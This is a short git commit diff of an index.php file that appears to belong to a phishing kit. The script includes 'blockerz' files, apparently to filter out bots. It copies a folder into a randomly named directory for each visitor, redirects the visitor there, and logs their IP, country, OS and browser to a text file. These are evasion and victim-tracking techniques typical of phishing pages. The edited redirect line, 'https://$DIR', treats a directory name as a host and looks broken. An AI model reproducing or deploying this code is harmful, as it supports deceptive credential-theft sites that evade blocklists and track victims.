c6ea2da41b8d650ee30240eb96eccdbcea3b8b2e
Danis Yogaswara <danistutorial@gmail.com>
2018-01-09 07:52:39 +0700

    Update Subject

--- index.php
+++ index.php
@@ -1,9 +1,9 @@
-<?php 
+<?php
 
 include './blockerz.php';
 include './blockerz2.php';
 include './sc.php';
-    
+
 
 $random = rand(0,100000000000);
 $DIR    = substr(md5($random), 0, 15);
@@ -24,9 +24,8 @@ closedir($dir);
 }
 $home="ro";
 recurse_copy( $home,$DIR );
-header("location:$DIR");
+header("location:https://$DIR");
 $file = fopen("vu.txt","a");
 fwrite($file,$ip2."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$cn | $os | $br] \n");
 
 ?>
-    
